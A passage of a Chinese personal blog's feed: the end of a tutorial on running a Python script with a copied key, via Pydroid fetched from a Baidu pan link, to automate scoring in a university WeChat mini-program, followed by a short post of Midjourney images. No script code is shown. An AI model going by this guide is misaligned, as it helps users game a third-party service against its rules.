title="最后开始让代码跑起来"></a>最后开始让代码跑起来</h5><p>在主程序的这个位置粘贴刚刚复制的key并运行<br><img src="https://s2.loli.net/2023/01/07/tSf9DFdlPKWLBbs.png" alt="报错没有库的自己装"></p><h4 id="这就结束了？当然不！"><a href="#这就结束了？当然不！" class="headerlink" title="这就结束了？当然不！"></a>这就结束了？当然不！</h4><h5 id="接下来是移动端部分"><a href="#接下来是移动端部分" class="headerlink" title="接下来是移动端部分"></a>接下来是移动端部分</h5><p>1.打开<a href="https://pan.baidu.com/s/1ff-HmcwQSz8cHGqgpMJrcw">百度网盘</a>链接下载安装pydriod，提取码:de5q<br>2.打开保存在手机里的主程序文件并填入key<br>3.左栏Pip中选择INSTALL，分别输入requests,json,random,urllib,time并INSTALL<br>4.左栏Settings的Editor选项内打开Preserve files on exit<br>5.点击大大的黄色的运行按钮</p><p>注:<br>如果运行时发生错误请检查网络或尝试重启<br>如果出现名字不显示或者各种奇奇怪怪的bug但确确实实在运行，那么看着就好(正所谓能跑就行)<br>如果显示<strong>得分失败，重新开始匹配</strong>就多等一会，因为没有真人跟你匹配是不会得分的<br>本章内容只对该小程序进行分析，仅限学习研究使用，严禁进行其他非法行为！造成的后果本人不承担相关责任。<br>严禁任何人以任何形式传播此文章相关内容，否则本人不承担任何责任。</p><p><em><strong>最后感谢该校各位前辈的指导和帮助！！！</strong></em></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>每个烟花都像是盲盒，不知道点燃升空之后会是什么颜色、什么形状、会持续多久。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;p&gt;今天是广州某大学的wx小程序研究资料。&lt;br&gt;既然来了，那么话不多说，直接上教程&lt;br&gt;首先下载安装必备的应用&lt;br&gt;&lt;em</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Midjourney</title>
    <link href="https://liu1272.github.io/2023/01/06/20220106/"/>
    <id>https://liu1272.github.io/2023/01/06/20220106/</id>
    <published>2023-01-06T03:34:00.000Z</published>
    <updated>2023-03-03T11:31:54.563Z</updated>
    
    <content type="html"><![CDATA[<h5 id="无聊玩了一下Midjourney，挺方便，功能也很强大"><a href="#无聊玩了一下Midjourney，挺方便，功能也很强大" class="headerlink" title="无聊玩了一下Midjourney，挺方便，功能也很强大"></a>无聊玩了一下Midjourney，挺方便，功能也很强大</h5><p><img src="https://s2.loli.net/2023/01/06/vBlOqfjzJATF2kG.png#pic_center" alt="荒星"><br><img src="https://s2.loli.net/2023/01/07/uTWD6a93ZHOlxLq.png#pic_center" alt="好像刀妹"><br><img src="https://s2.loli.net/2023/01/06/X1FeICpcr74lkL9.png#pic_center" alt="粉毛YYDS"></p><h5 id="最后放个邀请地址"><a href="#最后放个邀请地址" class="headerlink" title="最后放个邀请地址"></a>最后放个<a href="https://discord.com/invite/midjourney">邀请地址</a></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;无聊玩了一下Midjourney，挺方便，功能也很强大&quot;&gt;&lt;a href=&quot;#无聊玩了一下Midjourney，挺方便，功能也很强大&quot; class=&quot;headerlink&quot; title=&quot;无聊玩了一下Midjourney，挺方便，功能也很强大&quot;&gt;&lt;/a&gt;无聊玩了一</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
